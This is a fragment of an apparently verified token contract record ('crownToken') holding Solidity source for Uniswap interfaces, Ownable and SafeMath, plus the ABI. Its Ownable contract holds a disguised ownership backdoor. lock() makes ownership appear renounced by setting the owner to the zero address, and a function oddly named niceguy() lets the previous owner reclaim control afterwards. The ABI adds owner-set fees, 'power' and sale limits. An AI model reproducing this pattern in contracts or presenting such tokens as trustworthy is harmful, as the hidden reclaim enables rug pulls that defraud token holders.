path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n}\\r\\n\\r\\ninterface IUniswapV2Factory {\\r\\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\\r\\n\\r\\n    function feeTo() external view returns (address);\\r\\n    function feeToSetter() external view returns (address);\\r\\n\\r\\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\\r\\n    function allPairs(uint) external view returns (address pair);\\r\\n    function allPairsLength() external view returns (uint);\\r\\n\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n\\r\\n    function setFeeTo(address) external;\\r\\n    function setFeeToSetter(address) external;\\r\\n}\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\nimport \\u0027./Context.sol\\u0027;\\r\\nabstract contract Ownable is Context {\\r\\n    address private _owner;\\r\\n    address private _previousOwner;\\r\\n    uint256 private _lockTime;\\r\\n\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    constructor() {\\r\\n        _transferOwnership(_msgSender());\\r\\n    }\\r\\n\\r\\n    function owner() public view virtual returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(owner() == _msgSender(), \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        _transferOwnership(address(0));\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        _transferOwnership(newOwner);\\r\\n    }\\r\\n\\r\\n    function getniceguyTime() public view returns (uint256) {\\r\\n        return _lockTime;\\r\\n    }\\r\\n    \\r\\n    function getTime() public view returns (uint256) {\\r\\n        return block.timestamp;\\r\\n    }\\r\\n\\r\\n    function lock(uint256 time) public virtual onlyOwner {\\r\\n        _previousOwner = _owner;\\r\\n        _owner = address(0);\\r\\n        _lockTime = block.timestamp + time;\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n    }\\r\\n    \\r\\n    function niceguy() public virtual {\\r\\n        require(_previousOwner == msg.sender, \\\"You don\\u0027t have permission to niceguy\\\");\\r\\n        require(block.timestamp \\u003e _lockTime , \\\"Contract is locked\\\");\\r\\n        emit OwnershipTransferred(_owner, _previousOwner);\\r\\n        _owner = _previousOwner;\\r\\n    }\\r\\n\\r\\n    function _transferOwnership(address newOwner) internal virtual {\\r\\n        address oldOwner = _owner;\\r\\n        _owner = newOwner;\\r\\n        emit OwnershipTransferred(oldOwner, newOwner);\\r\\n    }\\r\\n}\"},\"SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\nlibrary SafeMath {\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        uint256 c = a + b;\\r\\n        require(c \\u003e= a, \\\"SafeMath: addition overflow\\\");\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b \\u003c= a, errorMessage);\\r\\n        uint256 c = a - b;\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        // Gas optimization: this is cheaper than requiring \\u0027a\\u0027 not being zero, but the\\r\\n        // benefit is lost if \\u0027b\\u0027 is also tested.\\r\\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\r\\n        if (a == 0) {\\r\\n            return 0;\\r\\n        }\\r\\n\\r\\n        uint256 c = a * b;\\r\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return div(a, b, \\\"SafeMath: division by zero\\\");\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b \\u003e 0, errorMessage);\\r\\n        uint256 c = a / b;\\r\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\\u0027t hold\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return mod(a, b, \\\"SafeMath: modulo by zero\\\");\\r\\n    }\\r\\n\\r\\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b != 0, errorMessage);\\r\\n        return a % b;\\r\\n    }\\r\\n}\\r\\n\\r\\nlibrary SafeMathInt {\\r\\n    int256 private constant MIN_INT256 = int256(1) \\u003c\\u003c 255;\\r\\n    int256 private constant MAX_INT256 = ~(int256(1) \\u003c\\u003c 255);\\r\\n\\r\\n    /**\\r\\n     * @dev Multiplies two int256 variables and fails on overflow.\\r\\n     */\\r\\n    function mul(int256 a, int256 b) internal pure returns (int256) {\\r\\n        int256 c = a * b;\\r\\n\\r\\n        // Detect overflow when multiplying MIN_INT256 with -1\\r\\n        require(c != MIN_INT256 || (a \\u0026 MIN_INT256) != (b \\u0026 MIN_INT256));\\r\\n        require((b == 0) || (c / b == a));\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Division of two int256 variables and fails on overflow.\\r\\n     */\\r\\n    function div(int256 a, int256 b) internal pure returns (int256) {\\r\\n        // Prevent overflow when dividing MIN_INT256 by -1\\r\\n        require(b != -1 || a != MIN_INT256);\\r\\n\\r\\n        // Solidity already throws when dividing by 0.\\r\\n        return a / b;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Subtracts two int256 variables and fails on overflow.\\r\\n     */\\r\\n    function sub(int256 a, int256 b) internal pure returns (int256) {\\r\\n        int256 c = a - b;\\r\\n        require((b \\u003e= 0 \\u0026\\u0026 c \\u003c= a) || (b \\u003c 0 \\u0026\\u0026 c \\u003e a));\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Adds two int256 variables and fails on overflow.\\r\\n     */\\r\\n    function add(int256 a, int256 b) internal pure returns (int256) {\\r\\n        int256 c = a + b;\\r\\n        require((b \\u003e= 0 \\u0026\\u0026 c \\u003e= a) || (b \\u003c 0 \\u0026\\u0026 c \\u003c a));\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    /**\\r\\n     * @dev Converts to absolute value, and fails on overflow.\\r\\n     */\\r\\n    function abs(int256 a) internal pure returns (int256) {\\r\\n        require(a != MIN_INT256);\\r\\n        return a \\u003c 0 ? -a : a;\\r\\n    }\\r\\n\\r\\n\\r\\n    function toUint256Safe(int256 a) internal pure returns (uint256) {\\r\\n        require(a \\u003e= 0);\\r\\n        return uint256(a);\\r\\n    }\\r\\n}\\r\\n\\r\\nlibrary SafeMathUint {\\r\\n  function toInt256Safe(uint256 a) internal pure returns (int256) {\\r\\n    int256 b = int256(a);\\r\\n    require(b \\u003e= 0);\\r\\n    return b;\\r\\n  }\\r\\n}\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeMultipleAccountsFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"SetAutomatedMarketMakerPair\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"oldAddress\",\"type\":\"address\"}],\"name\":\"UpdateUniswapV2Router\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_addLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_automatedMarketMakerPairs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_burnAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_burnFeeRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"f\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"u\",\"type\":\"address\"}],\"name\":\"_checkInviterLine\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_countInviteFeeRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"rate\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"}],\"name\":\"_getInviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_getMyInviter\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_inviterFeeMinHoldAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_inviterRates\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludedFromFees\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isLiquiding\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_liquidityAmounts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_liquidityRemoveFeeRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_liquiditySum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_liquidityUsers\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_marketAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_marketFeeRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxHoldAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxSaleRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"_partnerRates\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_partners\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_powers\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_rateBase\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_saleToAMMFeeRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"f\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"u\",\"type\":\"address\"}],\"name\":\"_setInviter\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"active\",\"type\":\"bool\"}],\"name\":\"_setIsLiquiding\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_setLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"active\",\"type\":\"bool\"}],\"name\":\"_setMeLiquiding\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"_setMyInviter\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"_setPartner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"_subLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_takeLiquidityReward\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"sum\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalFeeAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalFeeRate\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeMultipleAccountsFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"getPower\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getniceguyTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isExcludedFromFees\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"}],\"name\":\"lock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"niceguy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"setAutomatedMarketMakerPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"setBurnAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"feeRates_\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"inviterRates_\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"partnerRates_\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256\",\"name\":\"saleToAMMFeeRate_\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"liquidityRemoveFeeRate_\",\"type\":\"uint256\"}],\"name\":\"setFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"setFundAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setInviterFeeMinHoldAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"setMarketAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setMaxHoldAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"rate\",\"type\":\"uint256\"}],\"name\":\"setMaxSaleRate\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"actor\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"power\",\"type\":\"uint256\"}],\"name\":\"setPower\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"start\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"swap\",\"type\":\"uint256\"}],\"name\":\"setTime\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"wallet\",\"type\":\"address\"}],\"name\":\"setTotalFeeAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTime\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"contract IUniswapV2Router02\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddress\",\"type\":\"address\"}],\"name\":\"updateUniswapV2Router\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "crownToken", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a759d27d92389d666b58f58e4a08468ffa40bbb522272cc2067359b0ca33b012"}